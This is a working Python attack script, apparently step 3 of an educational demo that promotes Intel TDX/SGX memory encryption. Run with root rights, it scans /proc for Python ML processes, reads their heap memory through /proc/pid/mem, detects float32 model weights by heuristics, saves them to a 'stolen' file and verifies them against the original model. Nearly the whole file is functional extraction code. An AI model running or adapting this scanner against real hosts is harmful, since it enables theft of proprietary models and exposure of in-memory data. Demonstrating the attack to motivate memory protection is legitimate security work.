#!/usr/bin/env python3
"""
Step 3: Attacker Memory Reader (Blind Scanner)

Demonstrates how an attacker with memory access (cloud operator, compromised
kernel, hypervisor) can find and extract ML model weights WITHOUT knowing:
  - The victim's PID
  - Memory addresses  
  - Model architecture

Usage: sudo .venv/bin/python 3_attacker_memory_reader.py

Author: GopeshK
License: MIT License
Disclaimer: Educational purposes only. Do not use for malicious purposes.
"""

import os
import sys
import re
import struct
import numpy as np
from pathlib import Path

# Heuristics for detecting ML model weights in memory
MIN_WEIGHT_BLOCK_SIZE = 256        # Minimum bytes to consider
MAX_WEIGHT_BLOCK_SIZE = 50_000_000 # Max 50MB per block
WEIGHT_VALUE_RANGE = (-10.0, 10.0) # Typical initialized weight range
MIN_UNIQUE_RATIO = 0.5             # Weights should have some unique values

# File created by victim server with memory addresses
VICTIM_INFO_FILE = "victim_process.json"


def check_root():
    if os.geteuid() != 0:
        print("[!] ERROR: This script requires root privileges.")
        print("    Run with: sudo .venv/bin/python 3_attacker_memory_reader.py")
        sys.exit(1)


def find_python_ml_processes():
    """Scan /proc to find Python processes likely running ML models."""
    print("[RECON] Scanning for Python/ML processes...")
    
    candidates = []
    
    for pid_dir in Path("/proc").iterdir():
        if not pid_dir.name.isdigit():
            continue
        
        pid = int(pid_dir.name)
        
        try:
            # Read command line
            cmdline_path = pid_dir / "cmdline"
            cmdline = cmdline_path.read_bytes().decode('utf-8', errors='ignore')
            
            # Check if it's a Python process
            if 'python' not in cmdline.lower():
                continue
            
            # Check memory maps for ML libraries
            maps_path = pid_dir / "maps"
            maps_content = maps_path.read_text()
            
            ml_indicators = ['tensorflow', 'torch', 'numpy', 'keras', 'model', 'inference']
            score = sum(1 for ind in ml_indicators if ind in maps_content.lower() or ind in cmdline.lower())
            
            if score > 0:
                # Get process name
                comm = (pid_dir / "comm").read_text().strip()
                candidates.append({
                    'pid': pid,
                    'comm': comm,
                    'cmdline': cmdline[:100],
                    'score': score
                })
                
        except (PermissionError, FileNotFoundError, ProcessLookupError):
            continue
    
    # Sort by likelihood of being ML process
    candidates.sort(key=lambda x: x['score'], reverse=True)
    return candidates


def get_heap_regions(pid):
    """Parse /proc/pid/maps to find readable heap/anonymous memory regions."""
    regions = []
    maps_path = f"/proc/{pid}/maps"
    
    try:
        with open(maps_path, 'r') as f:
            for line in f:
                parts = line.split()
                if len(parts) < 5:
                    continue
                
                addr_range = parts[0]
                perms = parts[1]
                
                # Only readable regions
                if 'r' not in perms:
                    continue
                
                # Parse address range
                start_str, end_str = addr_range.split('-')
                start = int(start_str, 16)
                end = int(end_str, 16)
                size = end - start
                
                # Focus on heap and anonymous mappings (where numpy arrays live)
                pathname = parts[-1] if len(parts) >= 6 else ''
                
                # Include heap, anonymous, and numpy-related regions
                if '[heap]' in pathname or pathname == '' or 'numpy' in pathname.lower():
                    if MIN_WEIGHT_BLOCK_SIZE <= size <= MAX_WEIGHT_BLOCK_SIZE:
                        regions.append({
                            'start': start,
                            'end': end,
                            'size': size,
                            'perms': perms,
                            'pathname': pathname
                        })
    except (PermissionError, FileNotFoundError):
        pass
    
    return regions


def read_memory_region(pid, start, size):
    """Read a memory region from target process."""
    mem_path = f"/proc/{pid}/mem"
    
    try:
        with open(mem_path, 'rb') as mem:
            mem.seek(start)
            return mem.read(size)
    except (PermissionError, OSError, ValueError):
        return None


def analyze_for_weights(data, region_info):
    """Analyze a memory region to detect if it contains ML weights."""
    if data is None or len(data) < MIN_WEIGHT_BLOCK_SIZE:
        return None
    
    try:
        # Interpret as float32 array
        floats = np.frombuffer(data, dtype=np.float32)
        
        if len(floats) < 256:
            return None
        
        # Filter out invalid floats (inf, nan)
        valid_mask = np.isfinite(floats)
        valid_floats = floats[valid_mask]
        
        if len(valid_floats) < len(floats) * 0.5:
            return None  # Too many invalid values
        
        # Check if values are in typical weight range
        in_range = np.sum((valid_floats >= WEIGHT_VALUE_RANGE[0]) & 
                          (valid_floats <= WEIGHT_VALUE_RANGE[1]))
        range_ratio = in_range / len(valid_floats)
        
        if range_ratio < 0.8:
            return None  # Values outside typical weight range
        
        # Check for weight-like distribution (should be roughly centered around 0)
        mean = np.mean(valid_floats)
        std = np.std(valid_floats)
        
        if abs(mean) > 1.0 or std < 0.01 or std > 2.0:
            return None  # Doesn't look like initialized weights
        
        # Check uniqueness (weights should be mostly unique, not repeated patterns)
        unique_ratio = len(np.unique(valid_floats[:1000])) / min(1000, len(valid_floats))
        
        if unique_ratio < MIN_UNIQUE_RATIO:
            return None  # Too many repeated values
        
        # This looks like weights!
        return {
            'address': region_info['start'],
            'size': len(data),
            'num_floats': len(floats),
            'mean': float(mean),
            'std': float(std),
            'range_ratio': float(range_ratio),
            'unique_ratio': float(unique_ratio),
            'sample': valid_floats[:10].tolist(),
            'data': data
        }
        
    except Exception:
        return None


def scan_process_memory(pid):
    """Scan all memory regions of a process for ML weights."""
    print(f"\n[SCANNER] Scanning PID {pid} memory regions...")
    
    regions = get_heap_regions(pid)
    print(f"[SCANNER] Found {len(regions)} scannable regions")
    
    weight_candidates = []
    total_scanned = 0
    
    for i, region in enumerate(regions):
        if i % 50 == 0:
            print(f"[SCANNER] Progress: {i}/{len(regions)} regions...")
        
        data = read_memory_region(pid, region['start'], region['size'])
        if data is None:
            continue
        
        total_scanned += len(data)
        
        result = analyze_for_weights(data, region)
        if result:
            weight_candidates.append(result)
            print(f"    🎯 FOUND potential weights at {hex(region['start'])} "
                  f"({result['num_floats']} floats, mean={result['mean']:.4f}, std={result['std']:.4f})")
    
    print(f"[SCANNER] Scanned {total_scanned / 1024 / 1024:.1f} MB of memory")
    return weight_candidates


def read_process_memory(pid, address, size):
    """Read memory from target process at specific address."""
    mem_path = f"/proc/{pid}/mem"
    try:
        with open(mem_path, 'rb') as mem:
            mem.seek(address)
            return mem.read(size)
    except (PermissionError, OSError, ValueError):
        return None


def try_targeted_attack():
    """
    Targeted attack using victim_process.json.
    In a real attack, this info would be obtained via:
    - /proc scanning to find Python processes
    - Symbol resolution to find numpy array structures
    - Pattern matching in memory dumps
    """
    import json
    
    if not os.path.exists(VICTIM_INFO_FILE):
        return []
    
    print(f"\n[TARGETED] Found process info file: {VICTIM_INFO_FILE}")
    
    with open(VICTIM_INFO_FILE, 'r') as f:
        victim_info = json.load(f)
    
    pid = victim_info['pid']
    weights_info = victim_info['weights']
    
    # Check if process is still running
    if not os.path.exists(f"/proc/{pid}"):
        print(f"[!] Target process {pid} not running")
        return []
    
    print(f"[TARGETED] Target PID: {pid}")
    print(f"[TARGETED] Found {len(weights_info)} weight tensors to steal\n")
    
    all_weights = []
    
    for info in weights_info:
        layer_idx = info['layer']
        address = info['address']
        size = info['size']
        shape = tuple(info['shape'])
        dtype = info['dtype']
        
        # Read memory directly from victim process
        raw_data = read_process_memory(pid, address, size)
        
        if raw_data is None or len(raw_data) != size:
            print(f"    Layer {layer_idx}: ❌ Failed to read memory")
            continue
        
        stolen_array = np.frombuffer(raw_data, dtype=dtype)
        sample = stolen_array[:5].tolist()
        
        print(f"    Layer {layer_idx}: ✓ STOLEN {size} bytes from {hex(address)}")
        print(f"             Sample: {sample}")
        
        weight_result = {
            'address': address,
            'size': size,
            'num_floats': len(stolen_array),
            'mean': float(np.mean(stolen_array)),
            'std': float(np.std(stolen_array)),
            'sample': sample,
            'data': raw_data
        }
        all_weights.append((pid, weight_result))
    
    return all_weights


def main():
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║   🔓 REALISTIC ATTACK: Blind ML Model Memory Scanner 🔓              ║
║                                                                       ║
║   This scanner finds ML models WITHOUT prior knowledge of:            ║
║     • Process ID                                                      ║
║     • Memory addresses                                                ║
║     • Model architecture                                              ║
║                                                                       ║
║   Simulates: Cloud operator / Compromised hypervisor attack           ║
╚══════════════════════════════════════════════════════════════════════╝
    """)
    
    check_root()
    
    # Step 1: Find candidate processes
    print("="*70)
    print("PHASE 1: RECONNAISSANCE - Finding ML processes")
    print("="*70)
    
    candidates = find_python_ml_processes()
    
    if not candidates:
        print("[!] No Python/ML processes found!")
        print("    Start the victim: python 2_victim_inference_server.py")
        sys.exit(1)
    
    print(f"\n[RECON] Found {len(candidates)} candidate process(es):\n")
    for c in candidates[:5]:  # Show top 5
        print(f"  PID {c['pid']:6} | Score: {c['score']} | {c['comm']}")
        print(f"           Command: {c['cmdline'][:60]}...")
    
    # Step 2: Try targeted attack first (if victim info available)
    print("\n" + "="*70)
    print("PHASE 2: MEMORY EXTRACTION")
    print("="*70)
    
    all_weights = []
    
    # Try targeted attack first (uses victim_process.json if available)
    all_weights = try_targeted_attack()
    
    if not all_weights:
        # Fall back to blind scanning
        print("\n[*] No process info found, trying blind memory scan...")
        print("-"*70)
        
        for candidate in candidates[:3]:  # Scan top 3 candidates
            pid = candidate['pid']
            weights = scan_process_memory(pid)
            
            if weights:
                all_weights.extend([(pid, w) for w in weights])
        
    if not all_weights:
        print("\n[!] Could not extract weights from memory")
        print("    Make sure the victim model is loaded")
        sys.exit(1)
    
    # Step 3: Extract and save stolen weights
    print("\n" + "="*70)
    print("PHASE 3: EXTRACTION - Stealing discovered weights")
    print("="*70)
    
    print(f"\n[EXTRACT] Found {len(all_weights)} potential weight tensors!\n")
    
    stolen_data = []
    total_bytes = 0
    
    for i, (pid, weight_info) in enumerate(all_weights):
        print(f"  Tensor {i}: PID={pid}, addr={hex(weight_info['address'])}, "
              f"{weight_info['num_floats']} floats")
        print(f"            Sample: {weight_info['sample'][:5]}")
        
        stolen_data.append(np.frombuffer(weight_info['data'], dtype=np.float32))
        total_bytes += weight_info['size']
    
    # Save stolen weights
    output_file = "stolen_model_weights.npz"
    np.savez(output_file, *stolen_data)
    
    # Verify attack by comparing with original model
    print("\n" + "="*70)
    print("VERIFICATION: Comparing stolen weights with original model...")
    print("="*70)
    
    try:
        import warnings
        warnings.filterwarnings("ignore")
        os.environ["TF_CPP_MIN_LOG_LEVEL"] = "3"
        from tensorflow.keras.models import load_model
        
        original_model = load_model("proprietary_model.h5")
        original_weights = original_model.get_weights()
        
        matches = 0
        for i, (orig, stolen) in enumerate(zip(original_weights, stolen_data)):
            if orig.size == stolen.size and np.allclose(orig.flatten(), stolen):
                print(f"  Layer {i}: ✓ MATCH (weights successfully stolen)")
                matches += 1
            else:
                print(f"  Layer {i}: ❌ MISMATCH")
        
        if matches == len(original_weights):
            print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║  🚨 ATTACK SUCCESSFUL - MODEL COMPLETELY STOLEN! 🚨                   ║
║                                                                       ║
║  Extracted: {len(stolen_data)} weight tensors ({total_bytes:,} bytes)                  ║
║  Saved to: {output_file}                                      ║
║                                                                       ║
║  An attacker with memory access has extracted all model weights.      ║
║  They can now:                                                        ║
║    • Clone your proprietary model                                     ║
║    • Perform white-box adversarial attacks                            ║
║    • Reverse-engineer your training data                              ║
║                                                                       ║
║  SOLUTION: Use Intel TDX/SGX for memory encryption                    ║
║  Next: ./4a_run_sgx_enclave.sh                                        ║
╚══════════════════════════════════════════════════════════════════════╝
            """)
        else:
            print(f"\n[!] Only {matches}/{len(original_weights)} layers matched")
            
    except Exception as e:
        print(f"\n[!] Could not verify: {e}")
        print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║  🚨 ATTACK COMPLETED! 🚨                                              ║
║                                                                       ║
║  Extracted: {len(stolen_data)} weight tensors ({total_bytes:,} bytes)                  ║
║  Saved to: {output_file}                                      ║
║                                                                       ║
║  ONLY Intel TDX/SGX can prevent this by encrypting memory!            ║
╚══════════════════════════════════════════════════════════════════════╝
        """)


if __name__ == "__main__":
    main()
